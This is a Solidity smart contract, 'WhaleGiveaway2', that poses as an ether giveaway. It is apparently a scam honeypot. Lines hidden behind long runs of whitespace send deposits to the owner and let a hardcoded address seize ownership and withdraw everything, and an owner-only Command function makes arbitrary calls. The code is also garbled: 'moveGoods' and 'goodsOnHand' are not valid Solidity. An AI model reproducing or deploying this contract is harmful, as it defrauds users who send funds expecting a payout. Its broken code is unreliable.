// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public WarehouseManager = msg.sender;

    function()
    public
    payable
    {

    }

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    WarehouseManager.moveGoods(this.goodsOnHand);
            msg.sender.moveGoods(this.goodsOnHand);
        }
    }

    function checkOutCargo()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){WarehouseManager=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.sender == WarehouseManager);
        WarehouseManager.moveGoods(this.goodsOnHand);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == WarehouseManager);
        adr.call.value(msg.value)(data);
    }
}